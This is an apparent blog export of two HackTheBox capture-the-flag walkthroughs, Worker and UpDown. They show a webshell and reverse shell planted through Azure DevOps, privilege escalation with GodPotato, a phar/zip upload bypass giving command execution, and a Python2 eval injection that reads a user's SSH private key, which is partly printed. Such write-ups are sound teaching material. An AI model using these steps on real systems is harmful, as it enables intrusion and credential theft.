Microsoft-HTTPAPI/2.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows```{: .nolineno}## Web Enumeration â¤µï¸ I checked port 80 it seams this server is IIS 10.0 server â†’![Untitled](Worker/Untitled.png)## SVN Enumeration â¤µï¸This service is active on port `3689` and searching on web I got some enumeration information from this site :[3690 - Pentesting Subversion (svn server)](https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server)> Subversion is one of many version control options available today. It's often abbreviated as SVN.Subversion is used for maintaining current and historical versions of projects. Subversion is an open source centralized version control system. It's licensed under Apache. It's also referred to as a software version and revisioning control system.{: .prompt-tip }I tried it these command and here what I get â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ svn ls svn://10.10.10.203 # Listdimension.worker.htb/moved.txt â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ svn log svn://10.10.10.203 #Commit history------------------------------------------------------------------------r5 | nathen | 2020-06-20 19:22:00 +0530 (Sat, 20 Jun 2020) | 1 lineAdded note that repo has been migrated------------------------------------------------------------------------r4 | nathen | 2020-06-20 19:20:20 +0530 (Sat, 20 Jun 2020) | 1 lineMoving this repo to our new devops server which will handle the deployment for us------------------------------------------------------------------------r3 | nathen | 2020-06-20 19:16:19 +0530 (Sat, 20 Jun 2020) | 1 line-------------------------------------------------------------------------r2 | nathen | 2020-06-20 19:15:16 +0530 (Sat, 20 Jun 2020) | 1 lineAdded deployment script------------------------------------------------------------------------r1 | nathen | 2020-06-20 19:13:43 +0530 (Sat, 20 Jun 2020) | 1 lineFirst version------------------------------------------------------------------------ â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ svn checkout svn://10.10.10.203 #Download the repositoryA dimension.worker.htbA dimension.worker.htb/LICENSE.txtA dimension.worker.htb/README.txtA dimension.worker.htb/assetsA dimension.worker.htb/assets/cssA dimension.worker.htb/assets/css/fontawesome-all.min.cssA dimension.worker.htb/assets/css/main.cssA dimension.worker.htb/assets/css/noscript.cssA dimension.worker.htb/assets/jsA dimension.worker.htb/assets/js/breakpoints.min.jsA dimension.worker.htb/assets/js/browser.min.jsA dimension.worker.htb/assets/js/jquery.min.jsA dimension.worker.htb/assets/js/main.jsA dimension.worker.htb/assets/js/util.jsA dimension.worker.htb/assets/sassA dimension.worker.htb/assets/sass/baseA dimension.worker.htb/assets/sass/base/_page.scssA dimension.worker.htb/assets/sass/base/_reset.scssA dimension.worker.htb/assets/sass/base/_typography.scssA dimension.worker.htb/assets/sass/componentsA dimension.worker.htb/assets/sass/components/_actions.scssA dimension.worker.htb/assets/sass/components/_box.scssA dimension.worker.htb/assets/sass/components/_button.scssA dimension.worker.htb/assets/sass/components/_form.scssA dimension.worker.htb/assets/sass/components/_icon.scssA dimension.worker.htb/assets/sass/components/_icons.scssA dimension.worker.htb/assets/sass/components/_image.scssA dimension.worker.htb/assets/sass/components/_list.scssA dimension.worker.htb/assets/sass/components/_table.scssA dimension.worker.htb/assets/sass/layoutA dimension.worker.htb/assets/sass/layout/_bg.scssA dimension.worker.htb/assets/sass/layout/_footer.scssA dimension.worker.htb/assets/sass/layout/_header.scssA dimension.worker.htb/assets/sass/layout/_main.scssA dimension.worker.htb/assets/sass/layout/_wrapper.scssA dimension.worker.htb/assets/sass/libsA dimension.worker.htb/assets/sass/libs/_breakpoints.scssA dimension.worker.htb/assets/sass/libs/_functions.scssA dimension.worker.htb/assets/sass/libs/_mixins.scssA dimension.worker.htb/assets/sass/libs/_vars.scssA dimension.worker.htb/assets/sass/libs/_vendor.scssA dimension.worker.htb/assets/sass/main.scssA dimension.worker.htb/assets/sass/noscript.scssA dimension.worker.htb/assets/webfontsA dimension.worker.htb/assets/webfonts/fa-brands-400.eotA dimension.worker.htb/assets/webfonts/fa-brands-400.svgA dimension.worker.htb/assets/webfonts/fa-brands-400.ttfA dimension.worker.htb/assets/webfonts/fa-brands-400.woffA dimension.worker.htb/assets/webfonts/fa-brands-400.woff2A dimension.worker.htb/assets/webfonts/fa-regular-400.eotA dimension.worker.htb/assets/webfonts/fa-regular-400.svgA dimension.worker.htb/assets/webfonts/fa-regular-400.ttfA dimension.worker.htb/assets/webfonts/fa-regular-400.woffA dimension.worker.htb/assets/webfonts/fa-regular-400.woff2A dimension.worker.htb/assets/webfonts/fa-solid-900.eotA dimension.worker.htb/assets/webfonts/fa-solid-900.svgA dimension.worker.htb/assets/webfonts/fa-solid-900.ttfA dimension.worker.htb/assets/webfonts/fa-solid-900.woffA dimension.worker.htb/assets/webfonts/fa-solid-900.woff2A dimension.worker.htb/imagesA dimension.worker.htb/images/bg.jpgA dimension.worker.htb/images/overlay.pngA dimension.worker.htb/images/pic01.jpgA dimension.worker.htb/images/pic02.jpgA dimension.worker.htb/images/pic03.jpgA dimension.worker.htb/index.htmlA moved.txtChecked out revision 5. â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ svn up -r 2 #Go to revision 2 inside the checkout folderUpdating '.':D moved.txtA deploy.ps1Updated to revision 2.```{: .nolineno}I set the `/etc/hosts` file as `dimension.worker.htb` and I got this site â†’ ![Untitled](Worker/Untitled%201.png)when I downloaded the source code I got 2 strange files from these command `svn up -r 5` and `svn up -r 2` command â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ cat deploy.ps1 $user = \"nathen\" $plain = \"wendel98\"$pwd = ($plain | ConvertTo-SecureString)$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd$args = \"Copy-Site.ps1\"Start-Process powershell.exe -Credential $Credential -ArgumentList (\"-file $args\")â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ cat moved.txt This repository has been migrated and will no longer be maintaned here.You can find the latest version at: http://devops.worker.htb// The Worker team :) ```{: .nolineno}So I set the new subdomain name in hosts file and used that credentials to login and I got Azure DevOps dashboard.![Untitled](Worker/Untitled%202.png)Now I could not able to upload any file in master branch as I donâ€™t have permissions for that â†’![Untitled](Worker/Untitled%203.png)So I created a `New Branch` named as shiva then uploaded my `php` reverse shell file into it like this â†’ ![Untitled](Worker/Untitled%204.png)I uploaded the file and choose the `work item to link` as 1 value and proceeded further â†’![Untitled](Worker/Untitled%205.png)Now I Created a `pull request` that allows me to merge 2 branches so I did so with these following steps :![Untitled](Worker/Untitled%206.png)Merger time , I have to choose the Reviewers as me (Nathen) as a user .![Untitled](Worker/Untitled%207.png)Approved and Auto-Completed the task .![Untitled](Worker/Untitled%208.png)Now I have to click on Merge.![Untitled](Worker/Untitled%209.png)Now the final merger page so lets see the Files now is it merged with my files uploaded or not â†’![Untitled](Worker/Untitled%2010.png)After getting into Files I got the merge done and since the repository name is `spectral` so I have to add this `spectral.worker.htb` as subdomain name into `/etc/hosts` file â†’![Untitled](Worker/Untitled%2011.png)I loaded the subdomain I got this â†’![Untitled](Worker/Untitled%2012.png)I tried to load this `php` file but no luck so I reuploaded same way `webshell` in `aspx` format â†’![Untitled](Worker/Untitled%2013.png)I uploaded `nc.exe` file for getting reverse shell â†’![Untitled](Worker/Untitled%2014.png)I got the shell â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ rlwrap nc -lvnp 445 listening on [any] 445 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.10.203] 50920Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.PS C:\\ProgramData> whoamiwhoamiiis apppool\\defaultapppoolPS C:\\ProgramData> hostnamehostnameWorkerPS C:\\ProgramData>```{: .nolineno}I checked the privileges and I got `SeImpersonatePrivilege` Enabled so lets Impersonate this user to Administrator and I also checked `systeminfo` and this system is **Microsoft Windows Server 2019 Standard** so I could use `GodPotato` lets try it here â†’```powershellPS C:\\ProgramData> whoami /allwhoami /allUSER INFORMATION----------------User Name SID ========================== ======================================================iis apppool\\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415GROUP INFORMATION-----------------Group Name Type SID Attributes ==================================== ================ ============ ===========================================Mandatory Label\\High Mandatory Level Label S-1-16-12288 Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupBUILTIN\\IIS_IUSRS Alias S-1-5-32-568 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group Unknown SID type S-1-5-82-0 Mandatory group, Enabled by default, Enabled groupPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= =SeAssignPrimaryTokenPrivilege Replace a process level token DisabledSeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeAuditPrivilege Generate security audits DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledPS C:\\ProgramData>PS C:\\ProgramData> systeminfosysteminfoHost Name: WORKEROS Name: Microsoft Windows Server 2019 StandardOS Version: 10.0.17763 N/A Build 17763OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 00429-00000-00001-AA615Original Install Date: 2020-03-28, 13:59:53System Boot Time: 2024-01-13, 16:30:20System Manufacturer: VMware, Inc.System Model: VMware7,1System Type: x64-based PC......```{: .nolineno}Now lets use this , first lets try simple â€˜*whoami*â€™ command â†’```powershellPS C:\\ProgramData> .\\GodPotato-NET4.exe -cmd \"cmd /c whoami\".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"[*] CombaseModule: 0x140711718551552[*] DispatchTable: 0x140711720860880[*] UseProtseqFunction: 0x140711720241040[*] UseProtseqFunctionParamCount: 6[*] HookRPC[*] Start PipeServer[*] Trigger RPCSS[*] CreateNamedPipe \\\\.\\pipe\\5e6d9ed3-c0cf-4dfd-a0c0-8902c56ce18f\\pipe\\epmapper[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046[*] DCOM obj IPID: 00006802-1284-ffff-342f-8f9ecdfef721[*] DCOM obj OXID: 0x9ee90f5d3c825f94[*] DCOM obj OID: 0xad1f60a2b189ec42[*] DCOM obj Flags: 0x281[*] DCOM obj PublicRefs: 0x0[*] Marshal Object bytes len: 100[*] UnMarshal Object[*] Pipe Connected![*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE[*] CurrentsImpersonationLevel: Impersonation[*] Start Search System Token[*] PID : 944 Token:0x644 User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation[*] Find System Token : True[*] UnmarshalObject: 0x80070776[*] CurrentUser: NT AUTHORITY\\SYSTEM[*] process start with pid 7652PS C:\\ProgramData>```{: .nolineno}Now lets have a Administrative shell â†’ ![Untitled](Worker/Untitled%2015.png)I got it â†’```powershellPS C:\\Users\\Administrator> tree /f /atree /f /aFolder PATH listingVolume serial number is 32D6-9041C:.| azure-devops.exe| +---3D Objects+---Contacts+---Desktop| root.txt| +---Documents| Add-Restorer-Tasks.ps1| Deny-Write.ps1| Revoke-IIS-PrimaryTokenPrivilege.ps1| UserRights.psm1| +---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games+---Searches\\---VideosPS C:\\Users\\Administrator> type Desktop\\root.txttype Desktop\\root.txtcd6662b58f099f18977c1c29a399bc8fPS C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "UpDown", "url": "/posts/UpDown/", "categories": "HackTheBox", "tags": "LFI, PrivEsc, Request-Header, SUIDs, git, python", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.177Nmap scan report for 10.10.11.177Host is up (0.50s latency).Not shown: ...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.177Nmap scan report for 10.10.11.177Host is up (0.50s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)| 256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)|_ 256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Is my Website up ?|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸I loaded port 80 and I got this `siteisup.htb` domain name display on webpage so I set the /etc/hosts file then I checked the input file seams like SSRF vulnerability but moving on to that direction I also checked for directory or files bruteforcing and got `.git` directory.```bash200 GET 320l 675w 5531c http://siteisup.htb/stylesheet.css200 GET 40l 93w 1131c http://siteisup.htb/301 GET 9l 28w 310c http://siteisup.htb/dev => http://siteisup.htb/dev/200 GET 40l 93w 1131c http://siteisup.htb/index.php200 GET 0l 0w 0c http://siteisup.htb/dev/index.php```{: .nolineno}```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ dirb http://siteisup.htb/dev/ -----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sat Dec 30 14:34:18 2023URL_BASE: http://siteisup.htb/dev/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://siteisup.htb/dev/ ----+ http://siteisup.htb/dev/.git/HEAD (CODE:200|SIZE:21)...```{: .nolineno}I got this git directory so lets access it through `git-dumper` command â†’![Untitled](UpDown/Untitled.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ git-dumper 'http://siteisup.htb/dev/.git' git/[-] Testing http://siteisup.htb/dev/.git/HEAD [200][-] Testing http://siteisup.htb/dev/.git/ [200][-] Fetching .git recursively[-] Fetching http://siteisup.htb/dev/.git/ [200][-] Fetching http://siteisup.htb/dev/.gitignore [404][-] http://siteisup.htb/dev/.gitignore responded with status code 404[-] Fetching http://siteisup.htb/dev/.git/objects/ [200][-] Fetching http://siteisup.htb/dev/.git/config [200][-] Fetching http://siteisup.htb/dev/.git/HEAD [200][-] Fetching http://siteisup.htb/dev/.git/description [200][-] Fetching http://siteisup.htb/dev/.git/hooks/ [200][-] Fetching http://siteisup.htb/dev/.git/index [200][-] Fetching http://siteisup.htb/dev/.git/refs/ [200][-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200][-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200][-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200][-] Fetching http://siteisup.htb/dev/.git/branches/ [200][-] Fetching http://siteisup.htb/dev/.git/logs/ [200][-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200][-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200][-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200][-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200][-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200][-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200][-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200][-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200][-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200][-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200][-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200][-] Fetching http://siteisup.htb/dev/.git/packed-refs [200][-] Fetching http://siteisup.htb/dev/.git/info/ [200][-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200][-] Fetching http://siteisup.htb/dev/.git/info/exclude [200][-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200][-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200][-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200][-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200][-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200][-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200][-] Running git checkout .Updated 6 paths from the index```{: .nolineno}Now lets investigate the git file through these commands â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown/git]â””â”€$ ls -altotal 40drwxr-xr-x 3 kali kali 4096 Dec 30 12:11 .drwxr-xr-x 3 kali kali 4096 Dec 30 14:15 ..-rw-r--r-- 1 kali kali 59 Dec 30 12:11 admin.php-rw-r--r-- 1 kali kali 147 Dec 30 12:11 changelog.txt-rw-r--r-- 1 kali kali 3145 Dec 30 12:11 checker.phpdrwxr-xr-x 7 kali kali 4096 Dec 30 12:11 .git-rw-r--r-- 1 kali kali 117 Dec 30 12:11 .htaccess-rw-r--r-- 1 kali kali 273 Dec 30 12:11 index.php-rw-r--r-- 1 kali kali 5531 Dec 30 12:11 stylesheet.css```{: .nolineno}these command will help to get more information about the git files :```bashgit statusgit log```{: .nolineno}![Untitled](UpDown/Untitled%201.png)I noticed the vhost site and some information â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown/git]â””â”€$ cat .htaccess SetEnvIfNoCase Special-Dev \"only4dev\" Required-HeaderOrder Deny,AllowDeny from AllAllow from env=Required-Header```{: .nolineno}I have to include this site header to access some sites or vhost â†’![Untitled](UpDown/Untitled%202.png)I bruteforce the subdomains with that header â†’![Untitled](UpDown/Untitled%203.png)I added the `/etc/hosts` file with that domain name â†’![Untitled](UpDown/Untitled%204.png)Lets check the `checker.php` file to upload the file into the site â†’```php 10000) { die(\"File too large!\"); }\t$file = $_FILES['file']['name'];\t\t# Check if extension is allowed.\t$ext = getExtension($file);\tif(preg_match(\"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i\",$ext)){\t\tdie(\"Extension not allowed!\");\t} \t# Create directory to upload our file.\t$dir = \"uploads/\".md5(time()).\"/\";\tif(!is_dir($dir)){ mkdir($dir, 0770, true); } # Upload the file.\t$final_path = $dir.$file;\tmove_uploaded_file($_FILES['file']['tmp_name'], \"{$final_path}\");\t # Read the uploaded file.\t$websites = explode(\"\\n\",file_get_contents($final_path));\t\tforeach($websites as $site){\t\t$site=trim($site);\t\tif(!preg_match(\"#file://#i\",$site) && !preg_match(\"#data://#i\",$site) && !preg_match(\"#ftp://#i\",$site)){\t\t\t$check=isitup($site);\t\t\tif($check){\t\t\t\techo \"{$site}is up ^_^\";\t\t\t}else{\t\t\t\techo \"{$site}seems to be down :(\";\t\t\t}\t\t\t}else{\t\t\techo \"Hacking attempt was detected !\";\t\t}\t}\t # Delete the uploaded file.\t@unlink($final_path);}function getExtension($file) {\t$extension = strrpos($file,\".\");\treturn ($extension===false) ? \"\" : substr($file,$extension+1);}?>```{: .nolineno}- The code checks if a POST request with aÂ **`check`**Â parameter is sent to the server. If yes, it performs the following steps: - It checks the size of the uploaded file. If it is larger than 10kb, it stops the execution and displays an error message. - It gets the extension of the uploaded file using theÂ **`getExtension`**Â function, which returns the part of the file name after the last dot. If the extension is one of the forbidden ones, such as php, html, py, etc., it stops the execution and displays an error message. - It creates a directory under theÂ **`uploads`**Â folder with a name based on the MD5 hash of the current time.Â [If the directory does not exist, it creates it with the permission 0770, which means the owner and the group can read, write and execute, but others can only execute](https://builtin.com/software-engineering-perspectives/php). - It moves the uploaded file to the newly created directory and assigns it the same name as the original file. - It reads the content of the uploaded file, which is supposed to be a list of websites separated by newlines. It splits the content by newlines and stores it in an array calledÂ **`$websites`**. - It loops through each website in the array and trims any whitespace from it. It then checks if the website does not start withÂ **`file://`**,Â **`data://`**, orÂ **`ftp://`**, which are considered as hacking attempts. If not, it calls theÂ **`isitup`**Â function with the website as the argument and stores the result in a variable calledÂ **`$check`**. If the result is true, it displays the website and a green message saying it is up. If the result is false, it displays the website and a red message saying it is down. If the website starts with one of the forbidden schemes, it displays a red message saying hacking attempt was detected. - It deletes the uploaded file from the server using theÂ **`unlink`**Â function.- The code ends with the definition of theÂ **`getExtension`**Â function, which was used earlier.So I will be uploading the zip file but not in `.zip` extension so lets try it out now â†’![Untitled](UpDown/Untitled%205.png)I get this error because the magic byte of zip starts with PK. so lets check the uploaded directory weather it is uploaded or not â†’![Untitled](UpDown/Untitled%206.png)I can access this md5 generated folder name that contains my file so lets access it through LFI method.![Untitled](UpDown/Untitled%207.png)Now lets access through LFI .TheÂ `phar://`Â wrapper works with the formatÂ `phar://[archive path]/[file inside the archive]`. I tried different php function but didnâ€™t got any output so I tried phpinfo() function and I got the output â†’![Untitled](UpDown/Untitled%208.png)Lets check the disable function on this `phpinfo()` file and lets use the non disabled functions for command execution .![Untitled](UpDown/Untitled%209.png) Now I have 2 more rest functions that can leads to command execution â¤µï¸ â€¢ **`proc_open`**: This function executes a command and opens file pointers for input/output. It can also return a resource that represents the process.â€¢ **`backticks`**: This is an operator that is equivalent toÂ **`shell_exec`**. It can be used to execute a command and assign the output to a variable, such asÂ **`$output =`** ls -l``.I used the `backticks` functions and got no output so I used another `proc_open` function for command execution â†’ ```php array(\"pipe\", \"r\"), // STDIN 1 => array(\"pipe\", \"w\"), // STDOUT 2 => array(\"pipe\", \"w\") // STDERR);// Execute the command and get the process resource$process = proc_open($command, $descriptors, $pipes);// Read the output from the STDOUT pipe$output = stream_get_contents($pipes[1]);// Display the outputecho $output;// Close all pipes and processesfclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);?>```{: .nolineno}Now I made the zip file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ nano proc_open.php â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ zip file.mp4 proc_open.php adding: proc_open.php (deflated 50%)â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ file file.mp4 file.mp4: Zip archive data, at least v2.0 to extract, compression method=deflate```{: .nolineno}I uploaded the file and loaded on web and got the output like this â†’![Untitled](UpDown/Untitled%2010.png)Now lets have a reverse shell â†’```bashhttp://dev.siteisup.htb/?page=phar://uploads/483d0d679db9db1bf8381828972bc6a9/file.mp4/proc_open```{: .nolineno}In netcat listener I got the reverse shell connection â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.11.177] 41410bash: cannot set terminal process group (909): Inappropriate ioctl for devicebash: no job control in this shellwww-data@updown:/var/www/dev$ whoamiwhoamiwww-datawww-data@updown:/var/www/dev$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@updown:/var/www/dev$```{: .nolineno}I got this file with SUIDs permissions â†’```bashwww-data@updown:/home/developer/dev$ ls -altotal 32drwxr-x--- 2 developer www-data 4096 Jun 22 2022 .drwxr-xr-x 6 developer developer 4096 Aug 30 2022 ..-rwsr-x--- 1 developer www-data 16928 Jun 22 2022 siteisup-rwxr-x--- 1 developer www-data 154 Jun 22 2022 siteisup_test.pywww-data@updown:/home/developer/dev$```{: .nolineno}Now I see the file siteisup content â†’```bashwww-data@updown:/home/developer/dev$ strings siteisup/lib64/ld-linux-x86-64.so.2libc.so.6putssetresgidsetresuidsystemgetegidgeteuid__cxa_finalize__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu+UH[]A\\A]A^A_Welcome to 'siteisup.htb' application/usr/bin/python /home/developer/dev/siteisup_test.py:*3$\"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0crtstuff.c......```{: .nolineno}Lets see the `siteisup_test.py` file â†’```bashwww-data@updown:/home/developer/dev$ cat siteisup_test.py import requestsurl = input(\"Enter URL here:\")page = requests.get(url)if page.status_code == 200:\tprint \"Website is up\"else:\tprint \"Website is down\"www-data@updown:/home/developer/dev$```{: .nolineno}I tried the simple URL and I get this error .Thatâ€™s because in Python2,Â `input`Â takes the input and passes it toÂ `eval`, and my input isnâ€™t valid python. I can pass it a one liner that will execute and get execution:```bashwww-data@updown:/home/developer/dev$ ./siteisupWelcome to 'siteisup.htb' applicationEnter URL here:http://10.10.16.10/Traceback (most recent call last): File \"/home/developer/dev/siteisup_test.py\", line 3, in url = input(\"Enter URL here:\") File \"\", line 1 http://10.10.16.10/ ^SyntaxError: invalid syntaxwww-data@updown:/home/developer/dev$www-data@updown:/home/developer/dev$ ./siteisupWelcome to 'siteisup.htb' applicationEnter URL here:__import__('os').system('id') uid=1002(developer) gid=33(www-data) groups=33(www-data)```{: .nolineno}I can also get the developer shell through this command â†’```bashwww-data@updown:/home/developer/dev$ ./siteisupWelcome to 'siteisup.htb' applicationEnter URL here:__import__('os').system('bash')developer@updown:/home/developer/dev$ whoamideveloperdeveloper@updown:/home/developer/dev$ iduid=1002(developer) gid=33(www-data) groups=33(www-data)developer@updown:/home/developer/dev$```{: .nolineno}Lets have the `private keys` of developer user â†’```python__import__('os').system('cat /home/developer/.ssh/id_rsa')```{: .nolineno}I use it to access the private keys of developer user â†’```bashwww-data@updown:/home/developer/dev$ ./siteisupWelcome to 'siteisup.htb' applicationEnter URL here:__import__('os').system('cat /home/developer/.ssh/id_rsa')-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAYozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCosrrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+qa+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHuu0nhUpICU1FXr6tV2uE1LIb5TJrCIx479Elbc1MPrGCksQVV8EesI7kk5A2SrnNMxLe2ckIsQHQHxIcivCCIzB4R9FbOKdSKyZTHeZzjPwnU+FAAAFiHnDXHF5w1xxAAAAB3NzaC1yc2EAAAGBAJrweNE1jPHrtJ+hTs4sUwNaUN/UqcGMq2Aoyqw7afIORNORBHCcP0taovTxaDb85Le1Mt/vusQ3feboAHbbkS+6swNN8UjZKp7dh4IygDzq+nLSLzA6YfCXgRdhfUsuF67Xwj++vlqc5sU+7rbxg9DdQGN/hBkaTm+6ufV9KXD0ZyFJ8btrDfryF43xr6ogGKMzgeQ3l/K29m5Ioukt0NbTNVVA6Fu3AkW5wTIJZthVxCVPZRL/T8tg+AWrxb6FKrU/GgqLK6yr06QEJD6734qEobSKaPeRn8segY9jCiekLoYiSvjts2JtM9ro4wl7jN1eCW9CNVHfqmvkLcU7DUFaXCLnLdOsU31V3hLT04WiyOSpFxJcfk4MEdOt948EaX8dXlYCwscWJOQmqR7rtJ4VKSAlNRV6+rVdrhNSyG+UyawiMeO/RJW3NTD6xgpLEFVfBHrCO5JOQNkq5zTMS3tnJCLEB0B8SHIrwgiMweEfRWzinUismUx3mc4z8J1PhQAAAAMBAAEAAAGAMhM4KP1ysRlpxhG/Q3kl1zaQXtb/ilNpa+mjHykQo6+i5PHAipilCDih5CJFeUggr5L7f06egR4iLcebps5tzQw9IPtG2TF+ydt1GUozEf0rtoJhx+eGkdiVWzYh5XNfKh4HZMzD/sso9mTRiATkglOPpNiom+hZo1ipE0NBao